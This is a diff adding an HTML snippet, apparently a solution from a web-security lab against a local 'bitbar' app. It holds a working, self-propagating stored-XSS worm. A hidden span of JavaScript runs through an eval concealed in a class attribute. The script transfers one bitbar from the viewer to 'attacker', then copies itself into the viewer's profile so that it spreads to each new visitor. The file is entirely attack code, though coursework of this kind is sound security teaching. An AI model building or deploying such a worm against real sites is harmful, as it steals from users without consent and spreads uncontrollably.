@@ -1,0 +1,16 @@
+<span id="attack_profile">
+    <span id="bitbar_count" class="eval(document['getElementById']('myattack')['innerHTML'].replace('amp;', ''))"></span>
+    <span id="myattack" style="display: none;">
+        document.getElementById('myattack').style.display="none";
+    
+        var request1 = new XMLHttpRequest();
+        request1.open("POST","http://localhost:3000/post_transfer",false);
+        request1.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+        request1.send("destination_username=attacker&quantity=1");
+
+        var request2 = new XMLHttpRequest();
+        request2.open("POST","http://localhost:3000/set_profile",true);
+        request2.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+        request2.send("new_profile=".concat(encodeURIComponent(document.getElementById('attack_profile').outerHTML)));
+    </span>
+</span>
